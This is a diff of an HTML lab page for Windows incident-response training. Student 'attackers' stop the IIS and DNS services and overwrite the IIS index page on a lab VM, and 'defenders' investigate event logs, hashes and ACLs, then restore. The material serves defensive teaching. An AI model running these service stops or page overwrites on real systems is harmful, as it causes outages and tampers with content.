@@ -38,6 +38,10 @@
     margin-top: 32px
   }
 
+  h5 {
+    font-size: 1rem
+  }
+
   svg {
     width: 100%;
     height: auto
@@ -56,7 +60,9 @@
   }
 
   h2,
-  h3 {
+  h3,
+  h4,
+  h5 {
     scroll-margin-top: 24px
   }
 
@@ -174,6 +180,20 @@
 
   #training-sidebar .sidebar-toggle {
     display: none
+  }
+
+  #training-sidebar .sidebar-copyright {
+    margin: 20px 0 0;
+    padding-top: 12px;
+    border-top: 1px solid #ccd8e0;
+    font-size: 12px;
+    white-space: nowrap
+  }
+
+  #training-sidebar .sidebar-copyright a {
+    display: inline;
+    padding: 0;
+    margin: 0
   }
 
   #training-sidebar nav {
@@ -363,14 +383,15 @@
                   <summary><a href="student-workbook.html#module-1">Module 1 — Attacker already has system access</a>
                   </summary>
                   <ul class="section-children">
-                    <li><a class="submodule" href="student-workbook.html#service-tampering">1.1 — Service tampering and
+                    <li><a class="submodule" href="student-workbook.html#service-tampering">Task 1.1 — Service tampering and
                         recovery</a></li>
-                    <li><a class="submodule" href="student-workbook.html#web-integrity">1.2 — Web-content tampering and
+                    <li><a class="submodule" href="student-workbook.html#web-integrity">Task 1.2 — Web-content tampering and
                         evidence</a></li>
-                    <li><a class="submodule" href="student-workbook.html#firewall-tampering">1.3 — Firewall tampering
+                    <li><a class="submodule" href="student-workbook.html#firewall-tampering">Task 1.3 — Firewall tampering
                         versus service failure</a></li>
-                    <li><a class="submodule" href="student-workbook.html#account-compromise">1.4 — Compromised account
+                    <li><a class="submodule" href="student-workbook.html#account-compromise">Task 1.4 — Compromised account
                         and excessive privilege</a></li>
+                    <li><a class="submodule" href="student-workbook.html#data-exfiltration">Task 1.5 — Suspicious outbound traffic and data exfiltration</a></li>
                   </ul>
                 </details>
               </li>
@@ -388,14 +409,15 @@
                   <summary><a href="linux-training.html#module-1">Module 1 — Attacker already has system access</a>
                   </summary>
                   <ul class="section-children">
-                    <li><a class="submodule" href="linux-training.html#service-tampering">1.1 — Service tampering and
+                    <li><a class="submodule" href="linux-training.html#service-tampering">Task 1.1 — Service tampering and
                         recovery</a></li>
-                    <li><a class="submodule" href="linux-training.html#web-integrity">1.2 — Web-content tampering and
+                    <li><a class="submodule" href="linux-training.html#web-integrity">Task 1.2 — Web-content tampering and
                         evidence</a></li>
-                    <li><a class="submodule" href="linux-training.html#firewall-tampering">1.3 — Firewall tampering
+                    <li><a class="submodule" href="linux-training.html#firewall-tampering">Task 1.3 — Firewall tampering
                         versus service failure</a></li>
-                    <li><a class="submodule" href="linux-training.html#account-compromise">1.4 — Compromised account and
+                    <li><a class="submodule" href="linux-training.html#account-compromise">Task 1.4 — Compromised account and
                         excessive privilege</a></li>
+                    <li><a class="submodule" href="linux-training.html#data-exfiltration">Task 1.5 — Suspicious outbound traffic and data exfiltration</a></li>
                   </ul>
                 </details>
               </li>
@@ -404,22 +426,21 @@
                   <summary><a href="linux-training.html#module-2">Module 2 — Attacker starts without system access</a>
                   </summary>
                   <ul class="section-children">
-                    <li><a class="submodule" href="linux-training.html#discovery">2.1 — Port scanning and service
+                    <li><a class="submodule" href="linux-training.html#discovery">Task 2.1 — Port scanning and service
                         discovery</a></li>
                     <li><a class="submodule"
-                        href="linux-training.html#section-2-2-practical-investigate-failed-ssh-authentication">2.2
+                        href="linux-training.html#section-2-2-practical-investigate-failed-ssh-authentication">Task 2.2
                         Investigate failed SSH authentication</a></li>
                     <li><a class="submodule"
-                        href="linux-training.html#section-2-3-practical-investigate-web-probing-and-a-dummy-exposed-backup">2.3
+                        href="linux-training.html#section-2-3-practical-investigate-web-probing-and-a-dummy-exposed-backup">Task 2.3
                         Investigate web probing and a dummy exposed backup</a></li>
-                    <li><a class="submodule" href="linux-training.html#traffic">2.4 — Investigate suspicious request
+                    <li><a class="submodule" href="linux-training.html#traffic">Task 2.4 — Investigate suspicious request
                         traffic</a></li>
-                    <li><a class="submodule" href="linux-training.html#dos">2.5 — Investigate denial of service and
+                    <li><a class="submodule" href="linux-training.html#dos">Task 2.5 — Investigate denial of service and
                         resource exhaustion</a></li>
                   </ul>
                 </details>
               </li>
-              <li><a href="linux-training.html#section-inject-practice">Inject practice</a></li>
             </ul>
           </details>
         </li>
@@ -432,12 +453,13 @@
                 <details open>
                   <summary><a href="#module-1">Module 1 — Attacker already has system access</a></summary>
                   <ul class="section-children">
-                    <li><a class="submodule" href="#service-tampering">1.1 — Service tampering and recovery</a></li>
-                    <li><a class="submodule" href="#web-integrity">1.2 — Web-content tampering and evidence</a></li>
-                    <li><a class="submodule" href="#firewall-tampering">1.3 — Firewall tampering versus service
+                    <li><a class="submodule" href="#service-tampering">Task 1.1 — Service tampering and recovery</a></li>
+                    <li><a class="submodule" href="#web-integrity">Task 1.2 — Web-content tampering and evidence</a></li>
+                    <li><a class="submodule" href="#firewall-tampering">Task 1.3 — Firewall tampering versus service
                         failure</a></li>
-                    <li><a class="submodule" href="#account-compromise">1.4 — Compromised account and excessive
+                    <li><a class="submodule" href="#account-compromise">Task 1.4 — Compromised account and excessive
                         privilege</a></li>
+                    <li><a class="submodule" href="#data-exfiltration">Task 1.5 — Suspicious outbound traffic and data exfiltration</a></li>
                   </ul>
                 </details>
               </li>
@@ -445,20 +467,18 @@
                 <details open>
                   <summary><a href="#module-2">Module 2 — Attacker starts without system access</a></summary>
                   <ul class="section-children">
-                    <li><a class="submodule" href="#discovery">2.1 — Port scanning and service discovery</a></li>
-                    <li><a class="submodule" href="#section-2-2-practical-investigate-failed-windows-authentication">2.2
+                    <li><a class="submodule" href="#discovery">Task 2.1 — Port scanning and service discovery</a></li>
+                    <li><a class="submodule" href="#section-2-2-practical-investigate-failed-windows-authentication">Task 2.2
                         practical — Investigate failed Windows authentication</a></li>
                     <li><a class="submodule"
-                        href="#section-2-3-practical-investigate-iis-probing-and-a-dummy-exposed-backup">2.3 practical —
+                        href="#section-2-3-practical-investigate-iis-probing-and-a-dummy-exposed-backup">Task 2.3 practical —
                         Investigate IIS probing and a dummy exposed backup</a></li>
-                    <li><a class="submodule" href="#traffic">2.4 — Investigate suspicious request traffic</a></li>
-                    <li><a class="submodule" href="#dos">2.5 — Investigate denial of service and resource exhaustion</a>
+                    <li><a class="submodule" href="#traffic">Task 2.4 — Investigate suspicious request traffic</a></li>
+                    <li><a class="submodule" href="#dos">Task 2.5 — Investigate denial of service and resource exhaustion</a>
                     </li>
                   </ul>
                 </details>
               </li>
-              <li><a href="#business-inject">Practice — Business inject</a></li>
-              <li><a href="#section-inject-practice">Inject practice</a></li>
             </ul>
           </details>
         </li>
@@ -474,23 +494,15 @@
                   disk-space check</a></li>
               <li><a href="inject-practice.html#section-practice-c-match-network-listeners-to-processes">Practice C —
                   Match network listeners to processes</a></li>
+              <li><a href="inject-practice.html#business-inject">Practice D — Windows DNS business inject</a></li>
               <li><a href="inject-practice.html#section-when-you-need-help">When you need help</a></li>
             </ul>
           </details>
         </li>
-        <li>
-          <details class="page-group">
-            <summary><a href="command-reference.html">Command Reference</a></summary>
-            <ul class="page-children">
-              <li><a href="command-reference.html#section-how-to-read-the-manual">How to read the manual</a></li>
-              <li><a href="command-reference.html#linux">Linux and Bash</a></li>
-              <li><a href="command-reference.html#windows">Windows</a></li>
-              <li><a href="command-reference.html#section-understanding-the-scripts">Understanding the scripts</a></li>
-            </ul>
-          </details>
-        </li>
+        <li><a href="instructor-setup.html">Instructor Setup</a></li>
       </ul>
     </nav>
+    <p class="sidebar-copyright">&copy; 2026 <a href="https://3unrise.github.io/">SUNRISE Lab</a></p>
   </div>
 </aside>
 <h1>Windows Training</h1>
@@ -498,6 +510,7 @@
     credentials →</a>
 
 <h2 id="baseline">Preparation — Service inventory and baseline</h2>
+<h3>Step 1 — Record the service inventory and baseline</h3>
 <p>Identify your hostname, IP, listeners and running services. Compare with Overview.</p>
 <pre>hostname
 Get-NetIPConfiguration
@@ -505,317 +518,601 @@ Get-Service W3SVC,DNS
 Get-NetTCPConnection -State Listen
 Resolve-DnsName windows.training.test -Server 172.29.242.40
 Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-get-netipconfiguration">Get-NetIPConfiguration</a> · <a
-    href="command-reference.html#windows-get-service">Get-Service</a> · <a
-    href="command-reference.html#windows-get-nettcpconnection">Get-NetTCPConnection</a> · <a
-    href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-    href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-    href="command-reference.html#shell-test">test</a> · <a href="command-reference.html#windows-hostname">hostname</a>
-</p>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netipconfiguration">Get-NetIPConfiguration</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service">Get-Service</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection">Get-NetTCPConnection</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/dnsclient/resolve-dnsname">Resolve-DnsName</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest">Invoke-WebRequest</a> ·
+  <a href="https://www.gnu.org/software/bash/manual/bash.html">test</a> ·
+  <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname">hostname</a></p>
 <h2 id="module-1">Module 1 — Attacker already has system access</h2>
-<p>Read <a href="student-workbook.html#module-1">Module 1 concepts and the exercise workflow in Getting Started</a>,
-  then complete these platform tasks.</p>
-<h3 id="service-tampering">1.1 — Service tampering and recovery</h3>
-<p></p>
-<p>Location: service and investigation commands run in PowerShell INSIDE the Windows VM (CCDC-WINDOWS, 172.29.242.40).
-  The explicitly labeled laptop browser checks run on your own computer outside the VM. No Linux terminal or dig command
-  is needed. Sign in as CCDC-WINDOWS rainee, open PowerShell with Run as administrator, and approve UAC.</p>
-<p>Scenario: an attacker already has administrative access. These are two controlled service-stop rounds, not
-  demonstrations of obtaining that access. Follow the red-team/blue-team exercise workflow. Do not stop Remote Desktop
-  Services, change networking or disable the firewall.</p>
-<h3 id="section-step-1-verify-the-windows-baseline">Step 1 - Verify the Windows baseline</h3>
-<p> Verify the relevant services and record the results. </p>
-<pre>(Get-Date).ToUniversalTime().ToString(&#x27;o&#x27;)
-hostname
-Get-Service W3SVC,DNS
-(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-get-service">Get-Service</a> · <a
-    href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-    href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a> · <a href="command-reference.html#shell-test">test</a> ·
-  <a href="command-reference.html#windows-hostname">hostname</a>
-</p>
+<p>Practice investigating and recovering from changes made by an attacker who already has system access.</p>
+<h3 id="service-tampering">Task 1.1 — Service tampering and recovery</h3>
+<p>Practice investigating and recovering from service outages caused by an attacker who already has administrative
+  access. Practice web and DNS service outages using the steps below:</p>
+<ol>
+  <li>Verify the Windows baseline</li>
+  <li>Attacker: stop IIS</li>
+  <li>Defender: investigate the IIS outage</li>
+  <li>Defender: restore IIS</li>
+  <li>Attacker: stop DNS</li>
+  <li>Defender: investigate the DNS outage</li>
+  <li>Defender: restore DNS</li>
+  <li>Windows defense review and deliverables</li>
+</ol>
+<p><strong>Before you begin</strong></p>
+<p>Run service and investigation commands in elevated PowerShell inside the assigned Windows VM. Perform the labeled
+  laptop checks on your own computer. Keep Remote Desktop, networking and the firewall available throughout the exercise.</p>
+<h4 id="section-step-1-verify-the-windows-baseline">Step 1 — Verify the Windows baseline</h4>
+<p>Check the service states and record the results against the expected conditions for this step.</p>
+<p>Record the UTC time and confirm the VM hostname:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')
+hostname</pre>
+
+<p>Check service states and request the webpage:</p>
+<pre>Get-Service W3SVC,DNS
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+
+<p>Query DNS over UDP:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-date">Get-Date</a></p>
 <section id="service-web-windows-baseline">
-  <h4>Laptop browser check — baseline</h4>
+  <h5>Laptop browser check — baseline</h5>
   <p><strong>Location: your own computer, outside the VM.</strong> Before the attacker stops the service, confirm the
     website works from your own campus laptop. Open <a
       href="http://128.198.74.133:28080/index.html">http://128.198.74.133:28080/index.html</a>. Hard-refresh to avoid a
     cached page, or use the command below for a new request. Keep this separate from the guest-side commands above.</p>
   <p>Windows laptop, PowerShell:</p>
   <pre>curl.exe -i --max-time 5 http://128.198.74.133:28080/index.html</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+  <p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://curl.se/docs/manpage.html">curl</a></p>
   <p>macOS/Linux laptop, Terminal:</p>
   <pre>curl -i --max-time 5 http://128.198.74.133:28080/index.html</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+
   <p>Expect HTTP 200 and the page text <code>CCDC Windows intranet: operational</code>. Compare the response with the
     service state and timestamps inside the target VM. The relay's TCP port can still accept a connection when the guest
     HTTP service is down: a successful port test alone does not prove HTTP works. This is an HTTP service exercise; do
     not stop networking, RDP or TCP itself.</p>
 </section>
-<h3 id="section-windows-attacker-stops-iis">Round A - Windows attacker stops IIS</h3>
+<h4 id="section-windows-attacker-stops-iis">Step 2 — Attacker: stop IIS</h4>
 <p>Record the time, execute the stop once and hand over to the defender.</p>
-<pre>(Get-Date).ToUniversalTime().ToString(&#x27;o&#x27;)
-Stop-Service W3SVC</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-stop-service">Stop-Service</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a></p>
+<p>Record the current UTC time:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+
+<p>Stop only the assigned service:</p>
+<pre>Stop-Service W3SVC</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-service">Stop-Service</a></p>
 <section id="service-web-windows-outage">
-  <h4>Laptop browser check — outage</h4>
+  <h5>Laptop browser check — outage</h5>
   <p><strong>Location: your own computer, outside the VM.</strong> With the HTTP service stopped, test again from your
     own campus laptop before the defender restores it. Open <a
       href="http://128.198.74.133:28080/index.html">http://128.198.74.133:28080/index.html</a>. Hard-refresh to avoid a
     cached page, or use the command below for a new request. Keep this separate from the guest-side commands above.</p>
   <p>Windows laptop, PowerShell:</p>
   <pre>curl.exe -i --max-time 5 http://128.198.74.133:28080/index.html</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+
   <p>macOS/Linux laptop, Terminal:</p>
   <pre>curl -i --max-time 5 http://128.198.74.133:28080/index.html</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+
   <p>Expect a request failure, empty reply, timeout or HTTP error; the operational page must not be returned. IIS can
     return an HTTP error while its HTTP.sys TCP listener remains available. Compare the response with the service state
     and timestamps inside the target VM. The relay's TCP port can still accept a connection when the guest HTTP service
     is down: a successful port test alone does not prove HTTP works. This is an HTTP service exercise; do not stop
     networking, RDP or TCP itself.</p>
 </section>
-<h3 id="section-windows-defender-investigates">Round A - Windows defender investigates</h3>
+<h4 id="section-windows-defender-investigates">Step 3 — Defender: investigate the IIS outage</h4>
 <p>A failed request or an HTTP error is expected; it must not return the operational page. DNS should still answer.
   Capture evidence before recovery.</p>
+<p>Inspect the service states and compare them with the expected result for this step:</p>
+<pre>Get-Service W3SVC,DNS</pre>
+
+<p>Request the webpage and compare the response with the expected result:</p>
+<pre>Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5</pre>
+
+<p>Query DNS over UDP:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+
+<p>Inspect the relevant recent Windows event records:</p>
+<pre>Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddMinutes(-15)} | Where-Object ProviderName -eq 'Service Control Manager' | Select-Object TimeCreated,Id,Message</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent">Get-WinEvent</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object">Where-Object</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object">Select-Object</a> ·
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about">PowerShell syntax</a></p>
+<h4 id="section-windows-defender-restores-iis">Step 4 — Defender: restore IIS</h4>
+<p>Restart only the assigned service:</p>
+<pre>Start-Service W3SVC</pre>
+
+<p>Check service states and request the webpage:</p>
 <pre>Get-Service W3SVC,DNS
-Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile
-Get-WinEvent -FilterHashtable @{LogName=&#x27;System&#x27;; StartTime=(Get-Date).AddMinutes(-15)} |
-  Where-Object ProviderName -eq &#x27;Service Control Manager&#x27; |
-  Select-Object TimeCreated,Id,Message</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#linux-id">id</a> · <a href="command-reference.html#windows-get-service">Get-Service</a>
-  · <a href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-    href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a> · <a
-    href="command-reference.html#windows-get-winevent">Get-WinEvent</a> · <a
-    href="command-reference.html#windows-where-object">Where-Object</a> · <a
-    href="command-reference.html#windows-select-object">Select-Object</a> · <a
-    href="command-reference.html#shell-test">test</a> · <a href="command-reference.html#syntax">script syntax</a></p>
-<h3 id="section-windows-defender-restores-iis">Round A - Windows defender restores IIS</h3>
-<pre>Start-Service W3SVC
-Get-Service W3SVC,DNS
-(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content
-(Get-Date).ToUniversalTime().ToString(&#x27;o&#x27;)</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-get-service">Get-Service</a> · <a
-    href="command-reference.html#windows-start-service">Start-Service</a> · <a
-    href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a></p>
-<p> Verify the relevant services and record the results. </p>
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+
+<p>Record the current UTC time:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-service">Start-Service</a></p>
+<p>Check the service states and record the results against the expected conditions for this step.</p>
 <section id="service-web-windows-recovery">
-  <h4>Laptop browser check — recovery</h4>
+  <h5>Laptop browser check — recovery</h5>
   <p><strong>Location: your own computer, outside the VM.</strong> After restoring the HTTP service, repeat the same
     request from your own campus laptop. Open <a
       href="http://128.198.74.133:28080/index.html">http://128.198.74.133:28080/index.html</a>. Hard-refresh to avoid a
     cached page, or use the command below for a new request. Keep this separate from the guest-side commands above.</p>
   <p>Windows laptop, PowerShell:</p>
   <pre>curl.exe -i --max-time 5 http://128.198.74.133:28080/index.html</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+
   <p>macOS/Linux laptop, Terminal:</p>
   <pre>curl -i --max-time 5 http://128.198.74.133:28080/index.html</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+
   <p>Expect HTTP 200 and the page text <code>CCDC Windows intranet: operational</code>. Compare the response with the
     service state and timestamps inside the target VM. The relay's TCP port can still accept a connection when the guest
     HTTP service is down: a successful port test alone does not prove HTTP works. This is an HTTP service exercise; do
     not stop networking, RDP or TCP itself.</p>
 </section>
-<h3 id="section-windows-attacker-stops-dns">Round B - Windows attacker stops DNS</h3>
-<pre>(Get-Date).ToUniversalTime().ToString(&#x27;o&#x27;)
-Stop-Service DNS</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-stop-service">Stop-Service</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a></p>
-<h3 id="section-windows-defender-investigates-round-b">Round B - Windows defender investigates</h3>
-<p> Verify the relevant services and record the results. </p>
-<pre>Get-Service DNS,W3SVC
-Clear-DnsClientCache
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -QuickTimeout
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -TcpOnly -QuickTimeout
-(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content
-Get-WinEvent -FilterHashtable @{LogName=&#x27;System&#x27;; StartTime=(Get-Date).AddMinutes(-15)} |
-  Where-Object ProviderName -eq &#x27;Service Control Manager&#x27; |
-  Select-Object TimeCreated,Id,Message</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#linux-id">id</a> · <a href="command-reference.html#windows-get-service">Get-Service</a>
-  · <a href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-    href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a> · <a
-    href="command-reference.html#windows-get-winevent">Get-WinEvent</a> · <a
-    href="command-reference.html#windows-where-object">Where-Object</a> · <a
-    href="command-reference.html#windows-select-object">Select-Object</a> · <a
-    href="command-reference.html#windows-clear-dnsclientcache">Clear-DnsClientCache</a> · <a
-    href="command-reference.html#shell-test">test</a> · <a href="command-reference.html#syntax">script syntax</a></p>
+<h4 id="section-windows-attacker-stops-dns">Step 5 — Attacker: stop DNS</h4>
+<p>Record the current UTC time:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+
+<p>Stop only the assigned service:</p>
+<pre>Stop-Service DNS</pre>
+
+
+<h4 id="section-windows-defender-investigates-round-b">Step 6 — Defender: investigate the DNS outage</h4>
+<p>Check the service states and record the results against the expected conditions for this step.</p>
+<p>Inspect the service states and compare them with the expected result for this step:</p>
+<pre>Get-Service DNS,W3SVC</pre>
+
+<p>Clear the DNS client cache before testing the server:</p>
+<pre>Clear-DnsClientCache</pre>
+
+<p>Test DNS over both UDP and TCP:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -QuickTimeout
+Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -TcpOnly -QuickTimeout</pre>
+
+<p>Request the webpage and compare the response with the expected result:</p>
+<pre>(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+
+<p>Inspect the relevant recent Windows event records:</p>
+<pre>Get-WinEvent -FilterHashtable @{LogName='System'; StartTime=(Get-Date).AddMinutes(-15)} | Where-Object ProviderName -eq 'Service Control Manager' | Select-Object TimeCreated,Id,Message</pre>
+
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/dnsclient/clear-dnsclientcache">Clear-DnsClientCache</a></p>
 <section id="service-web-windows-dns">
-  <h4>Compare DNS failure with HTTP availability</h4>
+  <h5>Compare DNS failure with HTTP availability</h5>
   <p><strong>On your campus laptop:</strong> open <a
-      href="http://128.198.74.133:28080/index.html">http://128.198.74.133:28080/index.html</a> or repeat the Round A
-    curl command. The operational page should still load while DNS is stopped, provided IIS and the VM remain running.
+      href="http://128.198.74.133:28080/index.html">http://128.198.74.133:28080/index.html</a> or repeat the laptop curl command from Step 1. The operational page should still load while DNS is stopped, provided IIS and the VM remain running.
     This numeric URL bypasses guest DNS; it cannot prove that DNS works. Use the Resolve-DnsName UDP and TCP checks
     above inside Windows to establish DNS failure and repeat them after restoration. DNS over TCP means TCP port 53, not
     a separate TCP service to stop.</p>
 </section>
-<h3 id="section-windows-defender-restores-dns">Round B - Windows defender restores DNS</h3>
-<pre>Start-Service DNS
-Clear-DnsClientCache
-Get-Service DNS,W3SVC
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile
-Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -TcpOnly
-(Get-Date).ToUniversalTime().ToString(&#x27;o&#x27;)</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-get-service">Get-Service</a> · <a
-    href="command-reference.html#windows-start-service">Start-Service</a> · <a
-    href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-    href="command-reference.html#windows-get-date">Get-Date</a> · <a
-    href="command-reference.html#windows-clear-dnsclientcache">Clear-DnsClientCache</a> · <a
-    href="command-reference.html#shell-test">test</a></p>
-<h3 id="section-windows-defense-review-and-deliverables">Windows defense review and deliverables</h3>
-<p> Verify the relevant services and record the results. </p>
-<p>A service event may show a state change without proving who caused it, especially with a assigned account. Propose
+<h4 id="section-windows-defender-restores-dns">Step 7 — Defender: restore DNS</h4>
+<p>Restart only the assigned service:</p>
+<pre>Start-Service DNS</pre>
+
+<p>Clear the DNS client cache before testing the server:</p>
+<pre>Clear-DnsClientCache</pre>
+
+<p>Inspect the service states and compare them with the expected result for this step:</p>
+<pre>Get-Service DNS,W3SVC</pre>
+
+<p>Test DNS over both UDP and TCP:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile
+Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -TcpOnly</pre>
+
+<p>Record the current UTC time:</p>
+<pre>(Get-Date).ToUniversalTime().ToString('o')</pre>
+
+
+<h4 id="section-windows-defense-review-and-deliverables">Step 8 — Windows defense review and deliverables</h4>
+<p>Show the service-stop and recovery timeline for both service outages. Demonstrate the operational page from your laptop and
+  successful DNS responses over UDP and TCP. Explain why stopping IIS differed from stopping DNS, and keep your evidence.
+  No written report submission is required.</p>
+<p>A service event may show a state change without proving who caused it, especially with a shared account. Propose
   separate accounts, credential rotation, reduced unnecessary privilege and service monitoring. Keep the assigned
-  trainee01 administrator permission for the remaining lessons. These rounds have been documented for the configured
-  lab; the full revised student sequence still needs classroom rehearsal.</p>
-<h3 id="web-integrity">1.2 — Web-content tampering and evidence</h3>
-<p><a href="student-workbook.html#web-integrity">Shared concept →</a>. Run commands in elevated PowerShell inside the
-  Windows VM. The instructor confirms the Default Web Site uses C:\inetpub\wwwroot and starts with the operational page.
-  This round simulates an attacker who already has administrative access.</p>
-<h4>Prepare a trusted recovery copy</h4>
-<p>Instructor: use a new exercise directory; the guard prevents overwriting an earlier round’s evidence. Retain this
-  directory through the debrief.</p>
-<pre>$site = &#x27;C:\inetpub\wwwroot\index.html&#x27;
-$case = &#x27;C:\CCDC-Exercise-1-2&#x27;
-if (Test-Path $case) { throw &#x27;Existing exercise directory: ask the instructor to archive it first.&#x27; }
-if (-not (Test-Path $site)) { throw &#x27;Confirm the IIS physical path before proceeding.&#x27; }
-New-Item -ItemType Directory -Path $case | Out-Null
-Copy-Item -LiteralPath $site -Destination &quot;$case\original.html&quot;
-Get-FileHash -LiteralPath $site | Format-List
-(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
-<h4>Red team — change the page</h4>
-<pre>Set-Content -LiteralPath &#x27;C:\inetpub\wwwroot\index.html&#x27; -Value &#x27;CCDC exercise: changed page&#x27; -Encoding UTF8</pre>
-<h4>Blue team — investigate before restoring</h4>
-<p>Use your campus laptop to open <a href="http://128.198.74.133:28080/index.html">the Windows website</a> with a fresh
-  request. The request may succeed while the expected content is missing. In the VM:</p>
-<pre>$site = &#x27;C:\inetpub\wwwroot\index.html&#x27;
-$case = &#x27;C:\CCDC-Exercise-1-2&#x27;
-Get-Service W3SVC
-Get-Item -LiteralPath $site | Select-Object FullName,Length,LastWriteTimeUtc
-Get-FileHash -LiteralPath $site
-Get-FileHash -LiteralPath &quot;$case\original.html&quot;
-Copy-Item -LiteralPath $site -Destination &quot;$case\changed.html&quot;
-Get-Content -LiteralPath $site
-Get-Acl -LiteralPath $site | Format-List</pre>
-<p>Review recent IIS access records at the configured logging location (normally C:\inetpub\logs\LogFiles\W3SVC1). They
-  show requests, not who edited the file. File-change attribution requires auditing enabled before the change; do not
-  infer an attacker identity from a timestamp alone.</p>
-<h4>Blue team — recover and verify</h4>
